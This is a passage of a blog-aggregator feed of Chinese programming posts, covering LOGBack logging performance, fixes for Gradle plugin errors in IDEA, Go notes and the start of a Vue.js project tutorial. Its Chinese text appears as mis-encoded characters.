<p>‰∏∫‰∫ÜÈÅøÂÖç‰∫ßÁîüËøôÁßçÈ¢ùÂ§ñÁöÑËøêË°åÂºÄÈîÄÔºåÊèêÈ´òÁ®ãÂ∫èËøêË°åÊïàÁéáÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî® SLF4J ÁöÑÂèòÈáèÂåñÊó•ÂøóËÆ∞ÂΩïÊé•Âè£Ôºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">x.debug("Entry number: {} is {}", i, entry[i]);
</code></pre>
<p>ËøôÁßçÂèò‰ΩìÂÜôÊ≥ï‰∏ç‰ºö‰∫ßÁîüÈ¢ùÂ§ñÁöÑÂèòÈáèÊûÑÂª∫ÊàêÊú¨ÔºåÊó•Âøó‰ø°ÊÅØÂè™ÊúâËØ•Êó•ÂøóËØ∑Ê±ÇË¢´ÂèëÈÄÅÂà∞ËøΩÂä†Âô®ÔºàÂç≥Êª°Ë∂≥ËÆ∞ÂΩïË¶ÅÊ±ÇÂèäËæìÂá∫Â±ÇÁ∫ßÔºâ‰πãÂêéÊâç‰ºöË¢´Ê†ºÂºèÂåñÔºåÂπ∂‰∏îËØ•ÊñπÊ≥ïÁªèËøá‰∫Ü‰ºòÂåñÂ§ÑÁêÜÔºåËÉΩÂ§üÂæàÂ§ßÁ®ãÂ∫¶ÊèêÈ´òËøêË°åÊïàÁéá„ÄÇ</p>
<blockquote><p>
  ‰∏çÂª∫ËÆÆÂú®Âæ™ÁéØ‰∏≠‰ΩøÁî®Êó•ÂøóËÆ∞ÂΩïÔºåÂç≥‰Ωø‰∏çËÆ∞ÂΩïÊó•Âøó‰πü‰ºö‰∫ßÁîüÈ¢ùÂ§ñÁöÑÂºÄÈîÄÔºåËÆ∞ÂΩï‰∫ÜÊó•Âøó‰πü‰ºöËæìÂá∫Â§ßÈáèÁöÑÈáçÂ§çÊó†Áî®‰ø°ÊÅØ„ÄÇ
</p></blockquote>
<h3><span class="ez-toc-section" id="i-9">Êó•ÂøóÂô®Âú®Ê£ÄÊü•Êó•ÂøóÂ±ÇÁ∫ßÁöÑÊÄßËÉΩ</span></h3>
<p>Âú® LOGBack ‰∏≠ÔºåÊó•ÂøóÂô®‰∏çÈúÄË¶ÅÊ†πÊçÆÁªßÊâøÂÖ≥Á≥ªÂéªÂØªÊâæËá™Â∑±ÁúüÊ≠£ÊâÄÂØπÂ∫îÁöÑËÆ∞ÂΩïÂ±ÇÁ∫ßÔºåÂú®Êó•ÂøóÂô®Ë¢´ÂàõÂª∫‰πãÂêéÔºåÁªßÊâøÂÖ≥Á≥ªÂ∞±‰ºöÁ°ÆÂÆöÂπ∂‰∏îÁ°ÆÂÆö‰∫ÜËØ•Êó•ÂøóÂô®Ëá™Ë∫´ÁöÑËÆ∞ÂΩïÂ±ÇÁ∫ß„ÄÇÂπ∂‰∏îÊõ¥Êîπ‰∫ÜÊüê‰∏™Áà∂ËÆ∞ÂΩïÂô®ÁöÑËÆ∞ÂΩïÂ±ÇÁ∫ß‰πãÂêéÔºåÁõ∏ÂØπÂ∫îÁöÑÂ≠êËÆ∞ÂΩïÂô®ÈÉΩ‰ºöË¢´ÂèëÈÄÅËØ∑Ê±Ç‰ª•Êõ¥ÊîπËÆ∞ÂΩïÂ±ÇÁ∫ß„ÄÇÂõ†Ê≠§ÔºåÂú®ÊØîËæÉÊó•ÂøóÂ±ÇÁ∫ßÊó∂ÔºåÊó•ÂøóÂô®ËÉΩÂ§üÂÅöÂà∞ÂáÜÂç≥Êó∂ÁöÑÂÜ≥Á≠ñÔºåËÄå‰∏çÈúÄË¶ÅÂú®Ê≠§Â§ÑÂéªËØ∑Ê±ÇÁà∂ËÆ∞ÂΩïÂô®ÊâçËÉΩÂÅöÂá∫ÂÜ≥Á≠ñ„ÄÇ</p>
<h3><span class="ez-toc-section" id="i-10">Êó•ÂøóËæìÂá∫</span></h3>
<p>Êó•ÂøóÁúüÊ≠£Ë¢´ËæìÂá∫Âà∞Êñá‰ª∂ÊàñÊµÅ‰∏≠ÊòØÂºÄÈîÄÊúÄÂ§ßË∂äÊòØÊúÄ‰∏∫Ë¥πÊó∂ÁöÑÊìç‰Ωú„ÄÇ‰ªéÊó•ÂøóÂºÄÂßãËÆ∞ÂΩïÂà∞ÂÜôÂÖ•Êñá‰ª∂Á≥ªÁªü‰∏≠ÁöÑÂÖ∏ÂûãÂºÄÈîÄÊòØ 9 Âà∞ 12 ÊØ´ÁßíÔºåËã•‰∏∫ÂÜôÂà∞ËøúÁ´ØÊï∞ÊçÆÂ∫ìÊàñÊúçÂä°Âô®‰ºöÂÜçÂ¢ûÂä†Âá†ÊØ´ÁßíÁöÑÂª∂Êó∂„ÄÇÂ∞ΩÁÆ° LOGBack ÁöÑÂäüËÉΩÈùûÂ∏∏‰∏∞ÂØåÔºå‰ΩÜÊòØ LOGBack ÁöÑÊ†∏ÂøÉ‰æùÁÑ∂ÊòØ‰øùËØÅËøêË°åÊïàÁéáÔºåÂºÄÂèëËÄÖ‰ª¨Â∑≤Â§öÊ¨°‰∏∫‰∫ÜÂæóÂà∞Êõ¥Â•ΩÂú∞ÊÄßËÉΩÈáçÊûÑ LOGBack ÁªÑ‰ª∂„ÄÇ</p>
<div class="footnotes">
<hr />
<ol>
<li id="fn-863-1">
ÂÆòÊñπÊåáÂá∫ÂØπÊØîÁõ¥Êé•ÊãºÊé•Â≠óÁ¨¶‰∏≤ÁöÑÊñπÊ≥ïËÉΩÂ§üËá≥Â∞ëÊèêÈ´ò 30% ÁöÑÊÄßËÉΩ„ÄÇ&#160;<a href="#fnref-863-1">&#8617;</a>
</li>
</ol>
</div>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/java-logback-intro/">Java Êó•ÂøóÂåÖ LOGBack ÁÆÄ‰ªã</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZ‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/err-and-solution-of-config-gradle-idea-env/</id>
        <title><![CDATA[ÈÖçÁΩÆ Gradle (IDEA) ÁéØÂ¢ÉÁöÑÂùë]]></title>
        <updated>2019-07-26T02:47:51+08:00</updated>
        <link href="https://blog.triplez.cn/err-and-solution-of-config-gradle-idea-env/"/>
        <content type="text/html" src="https://blog.triplez.cn/err-and-solution-of-config-gradle-idea-env/"><![CDATA[<p>Ë¶ÅÂÅö‰∏™ Entry Task ÔºåÂÖ¥Â•ãÂú∞ÈÖçÁΩÆ‰∫Ü‰∏™ Java ÁöÑÁéØÂ¢ÉÔºåÊ≤°ÊÉ≥Âà∞Ë∏©‰∫ÜËøô‰πàÂ§öÂùë„ÄÇ</p>
<h2><span class="ez-toc-section" id="Plugin_was_not_found_in_any_of_the_following_sources">Plugin was not found in any of the following sources</span></h2>
<p>Spring Boot ÂÆòÊñπÊèê‰æõ‰∫Ü‰∏Ä‰∏™ <a href="https://start.spring.io/">Spring Intializr</a> ‰ª•Âø´ÈÄüÂàùÂßãÂåñÈ°πÁõÆÔºåÈÄâÊã©‰∫Ü Gradle Project ‰πãÂêéËøõÂÖ•È°πÁõÆÔºåIDEA ÁöÑ Gradle ÂêåÊ≠•‰∏ä‰∏ÄÁõ¥Êä•Â¶Ç‰∏ãÈîôËØØÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-null">Plugin [id: 'org.springframework.boot', version: '2.1.6.RELEASE'] was not found in any of the following sources:

- Gradle Core Plugins (plugin is not in 'org.gradle' namespace)
- Plugin Repositories (could not resolve plugin artifact 'org.springframework.boot:org.springframework.boot.gradle.plugin:2.1.6.RELEASE')
  Searched in the following repositories:
    Gradle Central Plugin Repository
</code></pre>
<p>ÊäòËÖæ‰∫ÜÂçäÂ§©ÔºåÊêúÁ¥¢‰∫ÜÊó†Êï∞Ëß£ÂÜ≥ÊñπÊ°àÈÉΩÊó†ÊïàÔºåÊúÄÂêéÊ†πÊçÆËøô‰∏™<a href="https://discuss.gradle.org/t/how-to-apply-a-plugin-not-in-gradle-core-or-gradle-central-plugin-repository/15605/2">ÂõûÁ≠î</a>ÊâçËß£ÂÜ≥„ÄÇ<del>ÂéüÂõ†Áé∞Âú®ËøòÊ≤°ÂºÑÊ∏ÖÊ•öÔºå‰ΩÜÊòØËÉΩ work „ÄÇ</del> Ëß£ÂÜ≥ÊñπÊ°àÂ¶Ç‰∏ãÔºö</p>
<p>Âú® <code>build.gradle</code> Êñá‰ª∂‰∏≠ÁöÑ <code>plugins</code> ÊòØËøôÊ†∑ÁöÑÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-groovy">plugins {
    id 'org.springframework.boot' version '2.1.6.RELEASE'
    id 'java'
}
</code></pre>
<p>Êõ¥Êîπ‰∏Ä‰∏ãÔºåÂ∞Ü <code>org.springframework.boot</code> ÂåÖÁßªÂá∫Âπ∂ÂéªÊéâÁâàÊú¨Âè∑Ôºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-groovy">plugins {
    id 'java'
}

apply plugin: 'org.springframework.boot'
</code></pre>
<p>‰∫éÊòØËøô‰∏™ÈîôËØØÂ∞±Ëß£ÂÜ≥‰∫Ü üòâ</p>
<h2><span class="ez-toc-section" id="Plugin_with_id_orgspringframeworkboot_not_found">Plugin with id 'org.springframework.boot' not found</span></h2>
<p>ÁÑ∂ËÄåÂÆÉ‰ºöÂèòÊàêÂè¶Â§ñ‰∏Ä‰∏™ÈîôËØØÔºåÂ¶Ç‰∏ãÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-null">Plugin with id 'org.springframework.boot' not found.
</code></pre>
<p>ÂèàÊäòËÖæÊêúÁ¥¢‰∫Ü‰∏ÄÁï™ÔºåÂèëÁé∞ÊòØÁº∫Â∞ë <code>buildscript</code> „ÄÇÂú® <code>build.gradle</code> Êñá‰ª∂ÊúÄÂâçÈù¢Âä†ÂÖ•Â¶Ç‰∏ãÂÜÖÂÆπÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-groovy">buildscript {
    repositories {
        mavenCentral()
    }
    dependencies {
        classpath 'org.springframework.boot:spring-boot-gradle-plugin:2.1.6.RELEASE'
    }
}
</code></pre>
<p>Problem solved !</p>
<h2><span class="ez-toc-section" id="Connection_to_the_Internet_denied">Connection to the Internet denied.</span></h2>
<p>ÈÅáÂà∞Ëøô‰∏™ÈîôËØØÔºåÂú® <code>build.gradle</code> ÁöÑ <code>repositories</code> ‰∏≠Êç¢‰∏Ä‰∏™ Maven Ê∫êÂç≥ÂèØ„ÄÇ</p>
<h2><span class="ez-toc-section" id="i">Êâæ‰∏çÂà∞ÊàñÊó†Ê≥ïÂä†ËΩΩ‰∏ªÁ±ª</span></h2>
<p>Âú®ËøêË°å Spring Boot ÁöÑÊó∂ÂÄôÈÅáÂà∞‰∫ÜËøô‰∏™ÈóÆÈ¢òÔºåÂú®ÂëΩ‰ª§Ë°å‰∏ä <code>gradle build</code> Âá∫ <code>jar</code> ÂåÖÊòØËÉΩÂ§üÊ≠£Â∏∏ËøêË°åÁöÑÔºåÁÑ∂ËÄåÂú® IDEA ÈáåÂ∞±‰∏çËÉΩÈÄöËøá <code>Run Application</code> Ê≠£Â∏∏ËøêË°å„ÄÇËß£ÂÜ≥ÊñπÊ°àÂÖ∂ÂÆûÁâπÂà´ÁâπÂà´ÁÆÄÂçïÔºöÂè≥ÈîÆÈ°πÁõÆ‰∏≠ÁöÑ <code>src</code> Êñá‰ª∂Â§πÔºåÊâæÂà∞ <code>Mark Directory as</code> ÔºåÈÄâÊã© <code>Sources Root</code> ÔºåÈáçÊñ∞ÊûÑÂª∫ËøêË°åÈ°πÁõÆÂç≥ÂèØ„ÄÇ</p>
<p>ÊäòËÖæ‰∏™ÁéØÂ¢ÉËä±‰∫Ü‰∏ÄÂ§©ÔºåËøòÊòØÂæóÂ•ΩÂ•ΩÂ≠¶‰π†Âïä‚Ä¶‚Ä¶</p>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/err-and-solution-of-config-gradle-idea-env/">ÈÖçÁΩÆ Gradle (IDEA) ÁéØÂ¢ÉÁöÑÂùë</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZ‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/06/go-internal-note/</id>
        <title><![CDATA[„ÄäÊ∑±ÂÖ•Ëß£ÊûêGo„ÄãÁ¨îËÆ∞]]></title>
        <updated>2019-06-24T08:40:49+08:00</updated>
        <link href="https://blog.stdioa.com/2019/06/go-internal-note/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/06/go-internal-note/"><![CDATA[<!-- build time:Mon Jun 24 2019 16:41:29 GMT+0800 (‰∏≠ÂõΩÊ†áÂáÜÊó∂Èó¥) --><p>Âú® GitHub ‰∏äÊâæÂà∞‰∏ÄÊú¨Ëß£ËØª Go ÂÆûÁé∞ÁªÜËäÇÁöÑÂ•Ω‰π¶ÔºåÂêçÂè´<a href="https://github.com/tiancaiamao/go-internals/" target="_blank" rel="noopener">„ÄäÊ∑±ÂÖ•Ëß£Êûê Go„Äã</a>„ÄÇ<br>Â§ßËá¥Áúã‰∫Ü‰∏ÄÈÅçÔºåÁÆÄÂçïÂÅö‰∫Ü‰∫õÁ¨îËÆ∞„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[Stdio‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/06/golang-learning-experience/</id>
        <title><![CDATA[Golang Â≠¶‰π†ËÆ∞ÂΩï]]></title>
        <updated>2019-06-24T08:25:39+08:00</updated>
        <link href="https://blog.stdioa.com/2019/06/golang-learning-experience/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/06/golang-learning-experience/"><![CDATA[<!-- build time:Mon Jun 24 2019 16:41:29 GMT+0800 (‰∏≠ÂõΩÊ†áÂáÜÊó∂Èó¥) --><p>ËøôÂá†‰∏™ÊúàÂú®ËÄÉËôë‰ªé Python ËΩ¨Âêë GolangÔºåÊâÄ‰ª•‰∏ìÈó®Â≠¶‰π†‰∫Ü Golang.<br>ËøôÈáåÊòØ Golang Â≠¶‰π†ÁöÑ‰∏Ä‰∫õËÆ∞ÂΩï„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[Stdio‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/05/find-minn-with-heap/</id>
        <title><![CDATA[Áî®Â†ÜÊâæÂá∫ÊúÄÂ∞èÁöÑ N ‰∏™Êï∞]]></title>
        <updated>2019-05-21T08:46:12+08:00</updated>
        <link href="https://blog.stdioa.com/2019/05/find-minn-with-heap/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/05/find-minn-with-heap/"><![CDATA[<!-- build time:Wed Jun 19 2019 17:59:18 GMT+0800 (‰∏≠ÂõΩÊ†áÂáÜÊó∂Èó¥) --><p>‰∏çÁü•ÈÅì‰∏∫Âï•ÔºåÁ™ÅÁÑ∂ÊÉ≥Ê∞¥‰∏ÄÁØáÂæàÊ∞¥ÁöÑÁÆóÊ≥ïÊñáÁ´†„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[Stdio‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/vue-demo-instruction/</id>
        <title><![CDATA[Vue.js ‰ªéÂÖ•ÂùëÂà∞ÂÖ•Âúü]]></title>
        <updated>2019-04-23T13:25:25+08:00</updated>
        <link href="https://blog.creedowl.com/posts/vue-demo-instruction/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/vue-demo-instruction/"><![CDATA[<h1 id="vuejs-‰ªéÂÖ•ÂùëÂà∞ÂÖ•Âúü">Vue.js ‰ªéÂÖ•ÂùëÂà∞ÂÖ•Âúü</h1>
<p>ËøëÂπ¥Êù•ÂâçÁ´ØÈ¢ÜÂüüÂèëÂ±ïÈ£ûÈÄüÔºå‰ªéÊúÄÊó©ÁöÑÁõ¥Êé•ÂÜôhtml, js, css Âà∞‰ΩøÁî®jQueryÂø´ÈÄüÂºÄÂèëÔºåÂÜçÂà∞ËøëÂπ¥Êù•‰ΩøÁî®VuejsÔºåReactjs ÂÆûÁé∞Â∑•Á®ãÂåñÂºÄÂèëÔºå‰πüÂ∞±Áü≠Áü≠ÂçÅÂá†Âπ¥„ÄÇËôΩÁÑ∂ÂâçÁ´ØÈ°πÁõÆÁªìÊûÑË∂äÊù•Ë∂äÂ§çÊùÇÔºå‰ΩÜ‰πüË∂äÊù•Ë∂äËßÑËåÉÔºåÊ∏ÖÊô∞ÔºåÊõ¥Âä†Â∑•Á®ãÂåñ„ÄÇÂΩìÂâçËæÉ‰∏∫ÊµÅË°åÁöÑÂâçÁ´ØÊ°ÜÊû∂ÊúâVuejs„ÄÅReactjs„ÄÅAngularjs Á≠âÔºåËÄåVuejsÁî±‰∫éÂÖ∂ÁÅµ(zhong)Ê¥ª(wen)ËΩª(wen)‰æø(dang)ÔºåËæÉ‰∏∫ÊµÅË°å„ÄÇËôΩÁÑ∂VuejsÊúâÂÆåÂñÑÁöÑ‰∏≠ÊñáÊñáÊ°£Ôºå‰ΩÜÊñáÊ°£‰∏ªË¶ÅÂú®‰ªãÁªçÂÖ∂Áî®Ê≥ïÔºåÁº∫Â∞ëÂ¶Ç‰ΩïÂÆûÁé∞‰∏Ä‰∏™ÂÆåÊï¥È°πÁõÆÁöÑÊåáÂØºÔºåÊú¨ÊñáÂ∞±‰ªãÁªçÂ¶Ç‰ΩïÁî®VuejsÂàõÂª∫‰∏Ä‰∏™ÂÆåÊï¥ÁöÑÂâçÁ´ØÈ°πÁõÆÔºåÂπ∂‰∏éÂêéÁ´ØËøõË°å‰∫§‰∫í„ÄÇ</p>
<p><strong>Êú¨ÊñáÂü∫‰∫é<a href="mailto:Vuejs@2.x">Vuejs@2.x</a>Âèä<a href="mailto:VueCLI@3.x">VueCLI@3.x</a></strong></p>
<ol>
<li>ÊâÄÈúÄÊäÄÊúØÊ†àÔºöhtml, javascript, cssÂü∫Á°ÄÁü•ËØÜÔºåÂÖ∂‰∏≠jsÂª∫ËÆÆ‰∫ÜËß£<strong>ES2015</strong>Ê†áÂáÜÔºåÁâπÂà´Ë¶ÅÊéåÊè°<strong>promise</strong>ÁöÑ‰ΩøÁî®</li>
<li>‰ΩøÁî®ÁöÑÂ∑•ÂÖ∑Ôºö<del>ÂÆáÂÆôÁ¨¨‰∏ÄÁºñËæëÂô®</del> VSCode ‚Äî‚Äî Áé∞Âú®ÂØπvueÈ°πÁõÆÁöÑÊîØÊåÅÂ∑≤ÁªèÂæàÂ•Ω‰∫ÜÔºåÂèØ‰ª•Ëá™Âä®ÂÆâË£ÖvueÈ°πÁõÆÈúÄË¶ÅÁöÑÊèí‰ª∂</li>
</ol>
<h1 id="0x0-ÂÆâË£Ö">0x0 ÂÆâË£Ö</h1>
<blockquote>
<p>Êé®Ëçê‰ΩøÁî®<a href="https://yarnpkg.com/lang/zh-hans">yarn</a>‰ª£Êõønpm‰Ωú‰∏∫ÂåÖÁÆ°ÁêÜÂô®</p>
</blockquote>
<h2 id="ÂÆâË£Övuecli">ÂÆâË£ÖVueCLI</h2>
<blockquote>
<p>VueCLIÊòØVuejsÂÆòÊñπÊé®Âá∫ÁöÑÈ°πÁõÆËÑöÊâãÊû∂Â∑•ÂÖ∑ÔºåÂèØ‰ª•Êñπ‰æøÁöÑÂàõÂª∫„ÄÅÁÆ°ÁêÜVueÈ°πÁõÆÔºåËøòÊèê‰æõ‰ºòÈõÖÁöÑwebÁÆ°ÁêÜÁïåÈù¢</p>
</blockquote>
<p>ÂÖ®Â±ÄÂÆâË£Ö<a href="https://cli.vuejs.org/zh/">VueCLI</a></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">yarn global add @vue/cli
</code></pre></div><h2 id="ÂÆâË£Övue-devtools">ÂÆâË£ÖVue-devtools</h2>
<blockquote>
<p><a href="https://github.com/vuejs/vue-devtools">Vue-devtools</a> ÊòØvueÂÆòÊñπÁöÑÊµèËßàÂô®ÂºÄÂèëÊèí‰ª∂ÔºåÂèØ‰ª•Êñπ‰æøÁöÑÂú®ÊµèËßàÂô®‰∏≠Ë∞ÉËØïvueÂ∫îÁî®</p>
</blockquote>
<p>Vue-devtools Êèê‰æõÂ§öÂπ≥Âè∞ÁöÑÊµèËßàÂô®Êèí‰ª∂ÂèØ‰ª•Áõ¥Êé•ÂÆâË£Ö‰ΩøÁî®</p>
<p><a href="https://github.com/vuejs/vue-devtools#installation">installation</a></p>
<h1 id="0x1-Êñ∞Âª∫È°πÁõÆ">0x1 Êñ∞Âª∫È°πÁõÆ</h1>
<p>‰ΩøÁî® <code>vue create vue_demo</code> ÂàõÂª∫Êñ∞È°πÁõÆÔºåÊé•‰∏ãÊù•‰ºöÂá∫Áé∞‰∏Ä‰∏™‰∫§‰∫íÂºèÂëΩ‰ª§Ë°åÂ∏Æ‰Ω†ÈÖçÁΩÆÈ°πÁõÆ„ÄÇ</p>
<p><strong>Ê≥®ÊÑèÊ≠§Â§Ñ‰∏çË¶Å‰ΩøÁî®ÈªòËÆ§ÁöÑÈÖçÁΩÆÔºÅÂÖ∑‰ΩìÈÖçÁΩÆÂèÇËÄÉ‰∏ãÂõæ</strong></p>
<blockquote>
<p>Âùëx1 ÈªòËÆ§ÁöÑÈÖçÁΩÆÂçÅÂàÜÁÆÄÂçïÔºåÊñ∞ÊâãÁªèÂ∏∏‰∏çÁü•ÈÅìÊÄé‰πàÂÜôÂ§öÈ°µÈù¢ÔºåÂºÑ‰∏çÊòéÁôΩÈ°πÁõÆÊÄé‰πàÁªÑÁªáÁöÑÔºåÊâÄ‰ª•ÈúÄË¶ÅËá™ÂÆö‰πâÈÖçÁΩÆÔºåÊ∑ªÂä†vue-routerÊèí‰ª∂ÂÆûÁé∞Â§öÈ°µÈù¢Ë∑≥ËΩ¨</p>
</blockquote>
<p><a href="https://asciinema.org/a/240155"><img src="https://asciinema.org/a/240155.svg" alt="asciicast"></a></p>
<h1 id="0x2-È°πÁõÆÊ°ÜÊû∂">0x2 È°πÁõÆÊ°ÜÊû∂</h1>
<p>Ê≠§Êó∂È°πÁõÆÂ∑≤ÁªèÂàõÂª∫ÊàêÂäüÔºåÂ¶ÇÊûú‰Ω†ÊåâÁÖßÊèêÁ§∫ÂêØÂä®È°πÁõÆÂ∞±ËÉΩÁúãÂà∞ÁªèÂÖ∏ÁöÑvueÂêØÂä®È°µ</p>
<p><img src="http://ww1.sinaimg.cn/large/0071ouepgy1g1yg2r5ysxj30up0mx3zv.jpg" alt="image"></p>
<p>ÂΩìÂâçÁöÑÈ°πÁõÆÁªìÊûÑÂ¶Ç‰∏ã</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">.                     È°πÁõÆÊ†πÁõÆÂΩï
‚îú‚îÄ‚îÄ README.md 
‚îú‚îÄ‚îÄ babel.config.js
‚îú‚îÄ‚îÄ package.json      È°πÁõÆ‰∏ªÈÖçÁΩÆÊñá‰ª∂
‚îú‚îÄ‚îÄ public            ÂÖ¨ÂÖ±ËµÑÊ∫êÊñá‰ª∂Â§π
‚îÇ   ‚îú‚îÄ‚îÄ favicon.ico
‚îÇ   ‚îî‚îÄ‚îÄ index.html    ÂÖ•Âè£html
‚îú‚îÄ‚îÄ src               Ê∫êÁ†ÅÊ†πÁõÆÂΩï
‚îÇ   ‚îú‚îÄ‚îÄ App.vue       ÂÖ•Âè£Êñá‰ª∂
‚îÇ   ‚îú‚îÄ‚îÄ assets        ËµÑÊ∫êÊñá‰ª∂Â§π
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ logo.png
‚îÇ   ‚îú‚îÄ‚îÄ components    ÁªÑ‰ª∂Êñá‰ª∂Â§π
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ HelloWorld.vue 
‚îÇ   ‚îú‚îÄ‚îÄ main.js       ÂÖ•Âè£ÈÖçÁΩÆÊñá‰ª∂
‚îÇ   ‚îú‚îÄ‚îÄ router.js     Ë∑ØÁî±Êñá‰ª∂
‚îÇ   ‚îú‚îÄ‚îÄ store.js      Áä∂ÊÄÅÁÆ°ÁêÜ
‚îÇ   ‚îî‚îÄ‚îÄ views         È°µÈù¢Êñá‰ª∂Â§π
‚îÇ       ‚îú‚îÄ‚îÄ About.vue
‚îÇ       ‚îî‚îÄ‚îÄ Home.vue
‚îî‚îÄ‚îÄ yarn.lock         ‰æùËµñÊñá‰ª∂
</code></pre></div><p>Âú®‰∏ãÈù¢ÁöÑÁ´†ËäÇÂÖ∑‰Ωì‰ªãÁªçÂêÑ‰∏™Êñá‰ª∂„ÄÅÊñá‰ª∂Â§πÁöÑÁî®Â§ÑÂíåÂ¶Ç‰ΩïÁªÑÁªáÈ°πÁõÆ„ÄÇ</p>
<h1 id="0x3-È°πÁõÆÁªìÊûÑ">0x3 È°πÁõÆÁªìÊûÑ</h1>
<p>Áî®vueÂºÄÂèëÁöÑÈ°πÁõÆ‰∏ÄËà¨ÊòØ<a href="https://zh.wikipedia.org/wiki/%E5%8D%95%E9%A1%B5%E5%BA%94%E7%94%A8">SPA(ÂçïÈ°µÂ∫îÁî®)</a>ÔºåÈÄöËøáÂä®ÊÄÅÈáçÂÜôÂΩìÂâçÈ°µÈù¢Êù•‰∏éÁî®Êà∑‰∫§‰∫íÔºåËÄå‰∏ç‰ºöÈáçÊñ∞Âä†ËΩΩÊï¥‰∏™Êñ∞È°µÈù¢„ÄÇÊâÄ‰ª•Ë¶ÅÁªÑÁªáÂ§öÈ°µÈù¢Â∞±Ë¶ÅÈÄöËøávue-routerÊù•ÁªÑÁªáÈ°µÈù¢ÔºåËÄåvuexÁî®Êù•‰øùÂ≠òÁä∂ÊÄÅ„ÄÇ</p>
<p>‰Ωú‰∏∫ÂçïÈ°µÂ∫îÁî®ÔºåÂΩìÁÑ∂ÈúÄË¶Å‰∏Ä‰∏™ÂÖ•Âè£htmlÊñá‰ª∂Ôºå‰πüÂ∞±ÊòØ <code>public/index.html</code> :</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">public/index.html

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;utf-8&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;X-UA-Compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;IE=edge&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width,initial-scale=1.0&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;icon&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&lt;%= BASE_URL %&gt;favicon.ico&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>vue_demo<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">noscript</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">strong</span><span class="p">&gt;</span>We&#39;re sorry but vue_demo doesn&#39;t work properly without JavaScript enabled. Please enable it to continue.<span class="p">&lt;/</span><span class="nt">strong</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">noscript</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="c">&lt;!-- built files will be auto injected --&gt;</span>
  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div><p>ËøôÊòØÈªòËÆ§ÁîüÊàêÁöÑ <code>index.html</code> ÔºåËÄåÁºñËØëÂ•ΩÁöÑÊñá‰ª∂ÔºàÁΩëÈ°µÂÜÖÂÆπÔºâ‰ºöË¢´Ëá™Âä®Ê≥®ÂÖ•Âà∞ `` ‰∏≠Ôºå‰πüÂ∞±ÊÑèÂë≥ÁùÄË¶Å‰ΩøÁî®vueÂºÄÂèëÁöÑÂ∫îÁî®ÔºåÊµèËßàÂô®ÂøÖÈ°ªÊîØÊåÅjs„ÄÇ</p>
<p>ËÄå#appÊâÄÁªëÂÆöÁöÑvueÂÆû‰æãÔºåÂàô‰Ωç‰∫é <code>src/main.js</code></p>
<hr>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">main</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
